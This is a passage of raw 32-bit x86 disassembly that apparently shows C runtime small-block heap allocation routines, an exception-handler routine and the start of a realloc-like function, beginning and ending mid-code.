  425058:	mov    eax,ebx
  42505a:	imul   eax,eax,0x204
  425060:	lea    eax,[eax+esi*1+0x144]
  425067:	push   0x3f
  425069:	mov    DWORD PTR [ebp-0x8],eax
  42506c:	pop    edx
  42506d:	mov    DWORD PTR [eax+0x8],eax
  425070:	mov    DWORD PTR [eax+0x4],eax
  425073:	add    eax,0x8
  425076:	dec    edx
  425077:	jne    0x42506d
  425079:	push   0x4
  42507b:	mov    edi,ebx
  42507d:	push   0x1000
  425082:	shl    edi,0xf
  425085:	add    edi,DWORD PTR [ecx+0xc]
  425088:	push   0x8000
  42508d:	push   edi
  42508e:	call   DWORD PTR ds:0x4280ac
  425094:	test   eax,eax
  425096:	jne    0x4250a0
  425098:	or     eax,0xffffffff
  42509b:	jmp    0x42513d
  4250a0:	lea    edx,[edi+0x7000]
  4250a6:	cmp    edi,edx
  4250a8:	mov    DWORD PTR [ebp-0x4],edx
  4250ab:	ja     0x4250f0
  4250ad:	mov    ecx,edx
  4250af:	sub    ecx,edi
  4250b1:	shr    ecx,0xc
  4250b4:	lea    eax,[edi+0x10]
  4250b7:	inc    ecx
  4250b8:	or     DWORD PTR [eax-0x8],0xffffffff
  4250bc:	or     DWORD PTR [eax+0xfec],0xffffffff
  4250c3:	lea    edx,[eax+0xffc]
  4250c9:	mov    DWORD PTR [eax],edx
  4250cb:	lea    edx,[eax-0x1004]
  4250d1:	mov    DWORD PTR [eax-0x4],0xff0
  4250d8:	mov    DWORD PTR [eax+0x4],edx
  4250db:	mov    DWORD PTR [eax+0xfe8],0xff0
  4250e5:	add    eax,0x1000
  4250ea:	dec    ecx
  4250eb:	jne    0x4250b8
  4250ed:	mov    edx,DWORD PTR [ebp-0x4]
  4250f0:	mov    eax,DWORD PTR [ebp-0x8]
  4250f3:	add    eax,0x1f8
  4250f8:	lea    ecx,[edi+0xc]
  4250fb:	mov    DWORD PTR [eax+0x4],ecx
  4250fe:	mov    DWORD PTR [ecx+0x8],eax
  425101:	lea    ecx,[edx+0xc]
  425104:	mov    DWORD PTR [eax+0x8],ecx
  425107:	mov    DWORD PTR [ecx+0x4],eax
  42510a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42510f:	xor    edi,edi
  425111:	inc    edi
  425112:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425119:	mov    al,BYTE PTR [esi+0x43]
  42511c:	mov    cl,al
  42511e:	inc    cl
  425120:	test   al,al
  425122:	mov    eax,DWORD PTR [ebp+0x8]
  425125:	mov    BYTE PTR [esi+0x43],cl
  425128:	jne    0x42512d
  42512a:	or     DWORD PTR [eax+0x4],edi
  42512d:	mov    edx,0x80000000
  425132:	mov    ecx,ebx
  425134:	shr    edx,cl
  425136:	not    edx
  425138:	and    DWORD PTR [eax+0x8],edx
  42513b:	mov    eax,ebx
  42513d:	pop    edi
  42513e:	pop    esi
  42513f:	pop    ebx
  425140:	leave  
  425141:	ret    
  425142:	push   ebp
  425143:	mov    ebp,esp
  425145:	sub    esp,0xc
  425148:	mov    ecx,DWORD PTR [ebp+0x8]
  42514b:	mov    eax,DWORD PTR [ecx+0x10]
  42514e:	push   ebx
  42514f:	push   esi
  425150:	mov    esi,DWORD PTR [ebp+0x10]
  425153:	push   edi
  425154:	mov    edi,DWORD PTR [ebp+0xc]
  425157:	mov    edx,edi
  425159:	sub    edx,DWORD PTR [ecx+0xc]
  42515c:	add    esi,0x17
  42515f:	shr    edx,0xf
  425162:	mov    ecx,edx
  425164:	imul   ecx,ecx,0x204
  42516a:	lea    ecx,[ecx+eax*1+0x144]
  425171:	mov    DWORD PTR [ebp-0xc],ecx
  425174:	mov    ecx,DWORD PTR [edi-0x4]
  425177:	and    esi,0xfffffff0
  42517a:	dec    ecx
  42517b:	cmp    esi,ecx
  42517d:	lea    edi,[ecx+edi*1-0x4]
  425181:	mov    ebx,DWORD PTR [edi]
  425183:	mov    DWORD PTR [ebp+0x10],ecx
  425186:	mov    DWORD PTR [ebp-0x4],ebx
  425189:	jle    0x4252e4
  42518f:	test   bl,0x1
  425192:	jne    0x4252dd
  425198:	add    ebx,ecx
  42519a:	cmp    esi,ebx
  42519c:	jg     0x4252dd
  4251a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251a5:	sar    ecx,0x4
  4251a8:	dec    ecx
  4251a9:	cmp    ecx,0x3f
  4251ac:	mov    DWORD PTR [ebp-0x8],ecx
  4251af:	jbe    0x4251b7
  4251b1:	push   0x3f
  4251b3:	pop    ecx
  4251b4:	mov    DWORD PTR [ebp-0x8],ecx
  4251b7:	mov    ebx,DWORD PTR [edi+0x4]
  4251ba:	cmp    ebx,DWORD PTR [edi+0x8]
  4251bd:	jne    0x425202
  4251bf:	cmp    ecx,0x20
  4251c2:	mov    ebx,0x80000000
  4251c7:	jae    0x4251e3
  4251c9:	shr    ebx,cl
  4251cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4251ce:	lea    ecx,[ecx+eax*1+0x4]
  4251d2:	not    ebx
  4251d4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4251d8:	dec    BYTE PTR [ecx]
  4251da:	jne    0x425202
  4251dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251df:	and    DWORD PTR [ecx],ebx
  4251e1:	jmp    0x425202
  4251e3:	add    ecx,0xffffffe0
  4251e6:	shr    ebx,cl
  4251e8:	mov    ecx,DWORD PTR [ebp-0x8]
  4251eb:	lea    ecx,[ecx+eax*1+0x4]
  4251ef:	not    ebx
  4251f1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4251f8:	dec    BYTE PTR [ecx]
  4251fa:	jne    0x425202
  4251fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251ff:	and    DWORD PTR [ecx+0x4],ebx
  425202:	mov    ecx,DWORD PTR [edi+0x8]
  425205:	mov    ebx,DWORD PTR [edi+0x4]
  425208:	mov    DWORD PTR [ecx+0x4],ebx
  42520b:	mov    ecx,DWORD PTR [edi+0x4]
  42520e:	mov    edi,DWORD PTR [edi+0x8]
  425211:	mov    DWORD PTR [ecx+0x8],edi
  425214:	mov    ecx,DWORD PTR [ebp+0x10]
  425217:	sub    ecx,esi
  425219:	add    DWORD PTR [ebp-0x4],ecx
  42521c:	cmp    DWORD PTR [ebp-0x4],0x0
  425220:	jle    0x4252cb
  425226:	mov    edi,DWORD PTR [ebp-0x4]
  425229:	mov    ecx,DWORD PTR [ebp+0xc]
  42522c:	sar    edi,0x4
  42522f:	dec    edi
  425230:	cmp    edi,0x3f
  425233:	lea    ecx,[ecx+esi*1-0x4]
  425237:	jbe    0x42523c
  425239:	push   0x3f
  42523b:	pop    edi
  42523c:	mov    ebx,DWORD PTR [ebp-0xc]
  42523f:	lea    ebx,[ebx+edi*8]
  425242:	mov    DWORD PTR [ebp+0x10],ebx
  425245:	mov    ebx,DWORD PTR [ebx+0x4]
  425248:	mov    DWORD PTR [ecx+0x4],ebx
  42524b:	mov    ebx,DWORD PTR [ebp+0x10]
  42524e:	mov    DWORD PTR [ecx+0x8],ebx
  425251:	mov    DWORD PTR [ebx+0x4],ecx
  425254:	mov    ebx,DWORD PTR [ecx+0x4]
  425257:	mov    DWORD PTR [ebx+0x8],ecx
  42525a:	mov    ebx,DWORD PTR [ecx+0x4]
  42525d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425260:	jne    0x4252b9
  425262:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425266:	mov    BYTE PTR [ebp+0x13],cl
  425269:	inc    cl
  42526b:	cmp    edi,0x20
  42526e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425272:	jae    0x425290
  425274:	cmp    BYTE PTR [ebp+0x13],0x0
  425278:	jne    0x425288
  42527a:	mov    ecx,edi
  42527c:	mov    ebx,0x80000000
  425281:	shr    ebx,cl
  425283:	mov    ecx,DWORD PTR [ebp+0x8]
  425286:	or     DWORD PTR [ecx],ebx
  425288:	lea    eax,[eax+edx*4+0x44]
  42528c:	mov    ecx,edi
  42528e:	jmp    0x4252b0
  425290:	cmp    BYTE PTR [ebp+0x13],0x0
  425294:	jne    0x4252a6
  425296:	lea    ecx,[edi-0x20]
  425299:	mov    ebx,0x80000000
  42529e:	shr    ebx,cl
  4252a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252a3:	or     DWORD PTR [ecx+0x4],ebx
  4252a6:	lea    eax,[eax+edx*4+0xc4]
  4252ad:	lea    ecx,[edi-0x20]
  4252b0:	mov    edx,0x80000000
  4252b5:	shr    edx,cl
  4252b7:	or     DWORD PTR [eax],edx
  4252b9:	mov    edx,DWORD PTR [ebp+0xc]
  4252bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4252bf:	lea    eax,[edx+esi*1-0x4]
  4252c3:	mov    DWORD PTR [eax],ecx
  4252c5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4252c9:	jmp    0x4252ce
  4252cb:	mov    edx,DWORD PTR [ebp+0xc]
  4252ce:	lea    eax,[esi+0x1]
  4252d1:	mov    DWORD PTR [edx-0x4],eax
  4252d4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4252d8:	jmp    0x425419
  4252dd:	xor    eax,eax
  4252df:	jmp    0x42541c
  4252e4:	jge    0x425419
  4252ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4252ed:	sub    DWORD PTR [ebp+0x10],esi
  4252f0:	lea    ecx,[esi+0x1]
  4252f3:	mov    DWORD PTR [ebx-0x4],ecx
  4252f6:	lea    ebx,[ebx+esi*1-0x4]
  4252fa:	mov    esi,DWORD PTR [ebp+0x10]
  4252fd:	sar    esi,0x4
  425300:	dec    esi
  425301:	cmp    esi,0x3f
  425304:	mov    DWORD PTR [ebp+0xc],ebx
  425307:	mov    DWORD PTR [ebx-0x4],ecx
  42530a:	jbe    0x42530f
  42530c:	push   0x3f
  42530e:	pop    esi
  42530f:	test   BYTE PTR [ebp-0x4],0x1
  425313:	jne    0x425399
  425319:	mov    esi,DWORD PTR [ebp-0x4]
  42531c:	sar    esi,0x4
  42531f:	dec    esi
  425320:	cmp    esi,0x3f
  425323:	jbe    0x425328
  425325:	push   0x3f
  425327:	pop    esi
  425328:	mov    ecx,DWORD PTR [edi+0x4]
  42532b:	cmp    ecx,DWORD PTR [edi+0x8]
  42532e:	jne    0x425372
  425330:	cmp    esi,0x20
  425333:	mov    ebx,0x80000000
  425338:	jae    0x425353
  42533a:	mov    ecx,esi
  42533c:	shr    ebx,cl
  42533e:	lea    esi,[esi+eax*1+0x4]
  425342:	not    ebx
  425344:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425348:	dec    BYTE PTR [esi]
  42534a:	jne    0x42536f
  42534c:	mov    ecx,DWORD PTR [ebp+0x8]
  42534f:	and    DWORD PTR [ecx],ebx
  425351:	jmp    0x42536f
  425353:	lea    ecx,[esi-0x20]
  425356:	shr    ebx,cl
  425358:	lea    ecx,[esi+eax*1+0x4]
  42535c:	not    ebx
  42535e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425365:	dec    BYTE PTR [ecx]
  425367:	jne    0x42536f
  425369:	mov    ecx,DWORD PTR [ebp+0x8]
  42536c:	and    DWORD PTR [ecx+0x4],ebx
  42536f:	mov    ebx,DWORD PTR [ebp+0xc]
  425372:	mov    ecx,DWORD PTR [edi+0x8]
  425375:	mov    esi,DWORD PTR [edi+0x4]
  425378:	mov    DWORD PTR [ecx+0x4],esi
  42537b:	mov    esi,DWORD PTR [edi+0x8]
  42537e:	mov    ecx,DWORD PTR [edi+0x4]
  425381:	mov    DWORD PTR [ecx+0x8],esi
  425384:	mov    esi,DWORD PTR [ebp+0x10]
  425387:	add    esi,DWORD PTR [ebp-0x4]
  42538a:	mov    DWORD PTR [ebp+0x10],esi
  42538d:	sar    esi,0x4
  425390:	dec    esi
  425391:	cmp    esi,0x3f
  425394:	jbe    0x425399
  425396:	push   0x3f
  425398:	pop    esi
  425399:	mov    ecx,DWORD PTR [ebp-0xc]
  42539c:	lea    ecx,[ecx+esi*8]
  42539f:	mov    edi,DWORD PTR [ecx+0x4]
  4253a2:	mov    DWORD PTR [ebx+0x8],ecx
  4253a5:	mov    DWORD PTR [ebx+0x4],edi
  4253a8:	mov    DWORD PTR [ecx+0x4],ebx
  4253ab:	mov    ecx,DWORD PTR [ebx+0x4]
  4253ae:	mov    DWORD PTR [ecx+0x8],ebx
  4253b1:	mov    ecx,DWORD PTR [ebx+0x4]
  4253b4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4253b7:	jne    0x425410
  4253b9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4253bd:	mov    BYTE PTR [ebp+0xf],cl
  4253c0:	inc    cl
  4253c2:	cmp    esi,0x20
  4253c5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4253c9:	jae    0x4253e7
  4253cb:	cmp    BYTE PTR [ebp+0xf],0x0
  4253cf:	jne    0x4253df
  4253d1:	mov    ecx,esi
  4253d3:	mov    edi,0x80000000
  4253d8:	shr    edi,cl
  4253da:	mov    ecx,DWORD PTR [ebp+0x8]
  4253dd:	or     DWORD PTR [ecx],edi
  4253df:	lea    eax,[eax+edx*4+0x44]
  4253e3:	mov    ecx,esi
  4253e5:	jmp    0x425407
  4253e7:	cmp    BYTE PTR [ebp+0xf],0x0
  4253eb:	jne    0x4253fd
  4253ed:	lea    ecx,[esi-0x20]
  4253f0:	mov    edi,0x80000000
  4253f5:	shr    edi,cl
  4253f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4253fa:	or     DWORD PTR [ecx+0x4],edi
  4253fd:	lea    eax,[eax+edx*4+0xc4]
  425404:	lea    ecx,[esi-0x20]
  425407:	mov    edx,0x80000000
  42540c:	shr    edx,cl
  42540e:	or     DWORD PTR [eax],edx
  425410:	mov    eax,DWORD PTR [ebp+0x10]
  425413:	mov    DWORD PTR [ebx],eax
  425415:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425419:	xor    eax,eax
  42541b:	inc    eax
  42541c:	pop    edi
  42541d:	pop    esi
  42541e:	pop    ebx
  42541f:	leave  
  425420:	ret    
  425421:	push   ebp
  425422:	mov    ebp,esp
  425424:	sub    esp,0x14
  425427:	mov    ecx,DWORD PTR [ebp+0x8]
  42542a:	mov    eax,ds:0x45cefc
  42542f:	mov    edx,DWORD PTR ds:0x45cf00
  425435:	add    ecx,0x17
  425438:	and    ecx,0xfffffff0
  42543b:	push   ebx
  42543c:	mov    DWORD PTR [ebp-0x10],ecx
  42543f:	sar    ecx,0x4
  425442:	push   esi
  425443:	lea    eax,[eax+eax*4]
  425446:	push   edi
  425447:	dec    ecx
  425448:	cmp    ecx,0x20
  42544b:	lea    edi,[edx+eax*4]
  42544e:	mov    DWORD PTR [ebp-0x4],edi
  425451:	jge    0x42545e
  425453:	or     esi,0xffffffff
  425456:	shr    esi,cl
  425458:	or     DWORD PTR [ebp-0x8],0xffffffff
  42545c:	jmp    0x42546b
  42545e:	add    ecx,0xffffffe0
  425461:	or     eax,0xffffffff
  425464:	xor    esi,esi
  425466:	shr    eax,cl
  425468:	mov    DWORD PTR [ebp-0x8],eax
  42546b:	mov    eax,ds:0x45cf08
  425470:	mov    ebx,eax
  425472:	mov    DWORD PTR [ebp-0xc],esi
  425475:	cmp    ebx,edi
  425477:	jmp    0x42548d
  425479:	mov    ecx,DWORD PTR [ebx+0x4]
  42547c:	mov    edi,DWORD PTR [ebx]
  42547e:	and    ecx,DWORD PTR [ebp-0x8]
  425481:	and    edi,esi
  425483:	or     ecx,edi
  425485:	jne    0x425492
  425487:	add    ebx,0x14
  42548a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42548d:	mov    DWORD PTR [ebp+0x8],ebx
  425490:	jb     0x425479
  425492:	cmp    ebx,DWORD PTR [ebp-0x4]
  425495:	jne    0x4254bb
  425497:	mov    ebx,edx
  425499:	jmp    0x4254ac
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    edi,DWORD PTR [ebx]
  4254a0:	and    ecx,DWORD PTR [ebp-0x8]
  4254a3:	and    edi,esi
  4254a5:	or     ecx,edi
  4254a7:	jne    0x4254b3
  4254a9:	add    ebx,0x14
  4254ac:	cmp    ebx,eax
  4254ae:	mov    DWORD PTR [ebp+0x8],ebx
  4254b1:	jb     0x42549b
  4254b3:	cmp    ebx,eax
  4254b5:	je     0x42554f
  4254bb:	mov    DWORD PTR ds:0x45cf08,ebx
  4254c1:	mov    eax,DWORD PTR [ebx+0x10]
  4254c4:	mov    edx,DWORD PTR [eax]
  4254c6:	cmp    edx,0xffffffff
  4254c9:	mov    DWORD PTR [ebp-0x4],edx
  4254cc:	je     0x4254e2
  4254ce:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4254d5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4254d9:	and    ecx,DWORD PTR [ebp-0x8]
  4254dc:	and    edi,esi
  4254de:	or     ecx,edi
  4254e0:	jne    0x425518
  4254e2:	mov    edx,DWORD PTR [eax+0xc4]
  4254e8:	and    edx,DWORD PTR [ebp-0x8]
  4254eb:	and    DWORD PTR [ebp-0x4],0x0
  4254ef:	lea    ecx,[eax+0x44]
  4254f2:	mov    esi,DWORD PTR [ecx]
  4254f4:	and    esi,DWORD PTR [ebp-0xc]
  4254f7:	or     edx,esi
  4254f9:	mov    esi,DWORD PTR [ebp-0xc]
  4254fc:	jne    0x425515
  4254fe:	mov    edx,DWORD PTR [ecx+0x84]
  425504:	and    edx,DWORD PTR [ebp-0x8]
  425507:	inc    DWORD PTR [ebp-0x4]
  42550a:	add    ecx,0x4
  42550d:	mov    edi,DWORD PTR [ecx]
  42550f:	and    edi,esi
  425511:	or     edx,edi
  425513:	je     0x4254fe
  425515:	mov    edx,DWORD PTR [ebp-0x4]
  425518:	mov    ecx,edx
  42551a:	imul   ecx,ecx,0x204
  425520:	lea    ecx,[ecx+eax*1+0x144]
  425527:	mov    DWORD PTR [ebp-0xc],ecx
  42552a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42552e:	xor    edi,edi
  425530:	and    ecx,esi
  425532:	jne    0x4255a1
  425534:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42553b:	and    ecx,DWORD PTR [ebp-0x8]
  42553e:	push   0x20
  425540:	pop    edi
  425541:	jmp    0x4255a1
  425543:	cmp    DWORD PTR [ebx+0x8],0x0
  425547:	jne    0x425554
  425549:	add    ebx,0x14
  42554c:	mov    DWORD PTR [ebp+0x8],ebx
  42554f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425552:	jb     0x425543
  425554:	cmp    ebx,DWORD PTR [ebp-0x4]
  425557:	jne    0x42557f
  425559:	mov    ebx,edx
  42555b:	jmp    0x425566
  42555d:	cmp    DWORD PTR [ebx+0x8],0x0
  425561:	jne    0x42556d
  425563:	add    ebx,0x14
  425566:	cmp    ebx,eax
  425568:	mov    DWORD PTR [ebp+0x8],ebx
  42556b:	jb     0x42555d
  42556d:	cmp    ebx,eax
  42556f:	jne    0x42557f
  425571:	call   0x424f85
  425576:	mov    ebx,eax
  425578:	test   ebx,ebx
  42557a:	mov    DWORD PTR [ebp+0x8],ebx
  42557d:	je     0x425597
  42557f:	push   ebx
  425580:	call   0x42503c
  425585:	pop    ecx
  425586:	mov    ecx,DWORD PTR [ebx+0x10]
  425589:	mov    DWORD PTR [ecx],eax
  42558b:	mov    eax,DWORD PTR [ebx+0x10]
  42558e:	cmp    DWORD PTR [eax],0xffffffff
  425591:	jne    0x4254bb
  425597:	xor    eax,eax
  425599:	jmp    0x425718
  42559e:	shl    ecx,1
  4255a0:	inc    edi
  4255a1:	test   ecx,ecx
  4255a3:	jge    0x42559e
  4255a5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255a8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255ac:	mov    ecx,DWORD PTR [edx]
  4255ae:	sub    ecx,DWORD PTR [ebp-0x10]
  4255b1:	mov    esi,ecx
  4255b3:	sar    esi,0x4
  4255b6:	dec    esi
  4255b7:	cmp    esi,0x3f
  4255ba:	mov    DWORD PTR [ebp-0x8],ecx
  4255bd:	jle    0x4255c2
  4255bf:	push   0x3f
  4255c1:	pop    esi
  4255c2:	cmp    esi,edi
  4255c4:	je     0x4256cb
  4255ca:	mov    ecx,DWORD PTR [edx+0x4]
  4255cd:	cmp    ecx,DWORD PTR [edx+0x8]
  4255d0:	jne    0x42562e
  4255d2:	cmp    edi,0x20
  4255d5:	mov    ebx,0x80000000
  4255da:	jge    0x425602
  4255dc:	mov    ecx,edi
  4255de:	shr    ebx,cl
  4255e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4255e3:	lea    edi,[eax+edi*1+0x4]
  4255e7:	not    ebx
  4255e9:	mov    DWORD PTR [ebp-0x14],ebx
  4255ec:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4255f0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4255f4:	dec    BYTE PTR [edi]
  4255f6:	jne    0x42562b
  4255f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4255fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4255fe:	and    DWORD PTR [ebx],ecx
  425600:	jmp    0x42562e
  425602:	lea    ecx,[edi-0x20]
  425605:	shr    ebx,cl
  425607:	mov    ecx,DWORD PTR [ebp-0x4]
  42560a:	lea    ecx,[eax+ecx*4+0xc4]
  425611:	lea    edi,[eax+edi*1+0x4]
  425615:	not    ebx
  425617:	and    DWORD PTR [ecx],ebx
  425619:	dec    BYTE PTR [edi]
  42561b:	mov    DWORD PTR [ebp-0x14],ebx
  42561e:	jne    0x42562b
  425620:	mov    ebx,DWORD PTR [ebp+0x8]
  425623:	mov    ecx,DWORD PTR [ebp-0x14]
  425626:	and    DWORD PTR [ebx+0x4],ecx
  425629:	jmp    0x42562e
  42562b:	mov    ebx,DWORD PTR [ebp+0x8]
  42562e:	cmp    DWORD PTR [ebp-0x8],0x0
  425632:	mov    ecx,DWORD PTR [edx+0x8]
  425635:	mov    edi,DWORD PTR [edx+0x4]
  425638:	mov    DWORD PTR [ecx+0x4],edi
  42563b:	mov    ecx,DWORD PTR [edx+0x4]
  42563e:	mov    edi,DWORD PTR [edx+0x8]
  425641:	mov    DWORD PTR [ecx+0x8],edi
  425644:	je     0x4256d7
  42564a:	mov    ecx,DWORD PTR [ebp-0xc]
  42564d:	lea    ecx,[ecx+esi*8]
  425650:	mov    edi,DWORD PTR [ecx+0x4]
  425653:	mov    DWORD PTR [edx+0x8],ecx
  425656:	mov    DWORD PTR [edx+0x4],edi
  425659:	mov    DWORD PTR [ecx+0x4],edx
  42565c:	mov    ecx,DWORD PTR [edx+0x4]
  42565f:	mov    DWORD PTR [ecx+0x8],edx
  425662:	mov    ecx,DWORD PTR [edx+0x4]
  425665:	cmp    ecx,DWORD PTR [edx+0x8]
  425668:	jne    0x4256c8
  42566a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42566e:	mov    BYTE PTR [ebp+0xb],cl
  425671:	inc    cl
  425673:	cmp    esi,0x20
  425676:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42567a:	jge    0x42569f
  42567c:	cmp    BYTE PTR [ebp+0xb],0x0
  425680:	jne    0x42568d
  425682:	mov    edi,0x80000000
  425687:	mov    ecx,esi
  425689:	shr    edi,cl
  42568b:	or     DWORD PTR [ebx],edi
  42568d:	mov    ecx,esi
  42568f:	mov    edi,0x80000000
  425694:	shr    edi,cl
  425696:	mov    ecx,DWORD PTR [ebp-0x4]
  425699:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42569d:	jmp    0x4256c8
  42569f:	cmp    BYTE PTR [ebp+0xb],0x0
  4256a3:	jne    0x4256b2
  4256a5:	lea    ecx,[esi-0x20]
  4256a8:	mov    edi,0x80000000
  4256ad:	shr    edi,cl
  4256af:	or     DWORD PTR [ebx+0x4],edi
  4256b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4256b5:	lea    edi,[eax+ecx*4+0xc4]
  4256bc:	lea    ecx,[esi-0x20]
  4256bf:	mov    esi,0x80000000
  4256c4:	shr    esi,cl
  4256c6:	or     DWORD PTR [edi],esi
  4256c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4256cb:	test   ecx,ecx
  4256cd:	je     0x4256da
  4256cf:	mov    DWORD PTR [edx],ecx
  4256d1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4256d5:	jmp    0x4256da
  4256d7:	mov    ecx,DWORD PTR [ebp-0x8]
  4256da:	mov    esi,DWORD PTR [ebp-0x10]
  4256dd:	add    edx,ecx
  4256df:	lea    ecx,[esi+0x1]
  4256e2:	mov    DWORD PTR [edx],ecx
  4256e4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4256e8:	mov    esi,DWORD PTR [ebp-0xc]
  4256eb:	mov    ecx,DWORD PTR [esi]
  4256ed:	test   ecx,ecx
  4256ef:	lea    edi,[ecx+0x1]
  4256f2:	mov    DWORD PTR [esi],edi
  4256f4:	jne    0x425710
  4256f6:	cmp    ebx,DWORD PTR ds:0x45cef8
  4256fc:	jne    0x425710
  4256fe:	mov    ecx,DWORD PTR [ebp-0x4]
  425701:	cmp    ecx,DWORD PTR ds:0x45cf10
  425707:	jne    0x425710
  425709:	and    DWORD PTR ds:0x45cef8,0x0
  425710:	mov    ecx,DWORD PTR [ebp-0x4]
  425713:	mov    DWORD PTR [eax],ecx
  425715:	lea    eax,[edx+0x4]
  425718:	pop    edi
  425719:	pop    esi
  42571a:	pop    ebx
  42571b:	leave  
  42571c:	ret    
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   esi
  425721:	inc    ebx
  425722:	xor    dh,BYTE PTR [eax]
  425724:	pop    eax
  425725:	inc    ebx
  425726:	xor    BYTE PTR [eax],dh
  425728:	push   ebp
  425729:	mov    ebp,esp
  42572b:	sub    esp,0x8
  42572e:	push   ebx
  42572f:	push   esi
  425730:	push   edi
  425731:	push   ebp
  425732:	cld    
  425733:	mov    ebx,DWORD PTR [ebp+0xc]
  425736:	mov    eax,DWORD PTR [ebp+0x8]
  425739:	test   DWORD PTR [eax+0x4],0x6
  425740:	jne    0x4257c8
  425746:	mov    DWORD PTR [ebp-0x8],eax
  425749:	mov    eax,DWORD PTR [ebp+0x10]
  42574c:	mov    DWORD PTR [ebp-0x4],eax
  42574f:	lea    eax,[ebp-0x8]
  425752:	mov    DWORD PTR [ebx-0x4],eax
  425755:	mov    esi,DWORD PTR [ebx+0xc]
  425758:	mov    edi,DWORD PTR [ebx+0x8]
  42575b:	cmp    esi,0xffffffff
  42575e:	je     0x4257c1
  425760:	lea    ecx,[esi+esi*2]
  425763:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425768:	je     0x4257af
  42576a:	push   esi
  42576b:	push   ebp
  42576c:	lea    ebp,[ebx+0x10]
  42576f:	call   DWORD PTR [edi+ecx*4+0x4]
  425773:	pop    ebp
  425774:	pop    esi
  425775:	mov    ebx,DWORD PTR [ebp+0xc]
  425778:	or     eax,eax
  42577a:	je     0x4257af
  42577c:	js     0x4257ba
  42577e:	mov    edi,DWORD PTR [ebx+0x8]
  425781:	push   ebx
  425782:	call   0x4266b0
  425787:	add    esp,0x4
  42578a:	lea    ebp,[ebx+0x10]
  42578d:	push   esi
  42578e:	push   ebx
  42578f:	call   0x4266f2
  425794:	add    esp,0x8
  425797:	lea    ecx,[esi+esi*2]
  42579a:	push   0x1
  42579c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257a0:	call   0x426786
  4257a5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257a8:	mov    DWORD PTR [ebx+0xc],eax
  4257ab:	call   DWORD PTR [edi+ecx*4+0x8]
  4257af:	mov    edi,DWORD PTR [ebx+0x8]
  4257b2:	lea    ecx,[esi+esi*2]
  4257b5:	mov    esi,DWORD PTR [edi+ecx*4]
  4257b8:	jmp    0x42575b
  4257ba:	mov    eax,0x0
  4257bf:	jmp    0x4257dd
  4257c1:	mov    eax,0x1
  4257c6:	jmp    0x4257dd
  4257c8:	push   ebp
  4257c9:	lea    ebp,[ebx+0x10]
  4257cc:	push   0xffffffff
  4257ce:	push   ebx
  4257cf:	call   0x4266f2
  4257d4:	add    esp,0x8
  4257d7:	pop    ebp
  4257d8:	mov    eax,0x1
  4257dd:	pop    ebp
  4257de:	pop    edi
  4257df:	pop    esi
  4257e0:	pop    ebx
  4257e1:	mov    esp,ebp
  4257e3:	pop    ebp
  4257e4:	ret    
  4257e5:	push   ebp
  4257e6:	mov    ecx,DWORD PTR [esp+0x8]
  4257ea:	mov    ebp,DWORD PTR [ecx]
  4257ec:	mov    eax,DWORD PTR [ecx+0x1c]
  4257ef:	push   eax
  4257f0:	mov    eax,DWORD PTR [ecx+0x18]
  4257f3:	push   eax
  4257f4:	call   0x4266f2
  4257f9:	add    esp,0x8
  4257fc:	pop    ebp
  4257fd:	ret    0x4
  425800:	call   0x42370d
  425805:	add    eax,0x8
  425808:	ret    
  425809:	push   0x14
  42580b:	push   0x428768
  425810:	call   0x423858
  425815:	mov    edi,DWORD PTR [ebp+0x8]
  425818:	xor    ebx,ebx
  42581a:	cmp    edi,ebx
  42581c:	jne    0x42582c
  42581e:	push   DWORD PTR [ebp+0xc]
  425821:	call   0x424582
  425826:	pop    ecx
  425827:	jmp    0x4259b0
  42582c:	mov    esi,DWORD PTR [ebp+0xc]
  42582f:	cmp    esi,ebx
  425831:	jne    0x42583f
  425833:	push   edi
  425834:	call   0x42446a
  425839:	pop    ecx
  42583a:	jmp    0x4259ae
  42583f:	cmp    DWORD PTR ds:0x45d144,0x3
  425846:	jne    0x42597a
  42584c:	mov    DWORD PTR [ebp-0x1c],ebx
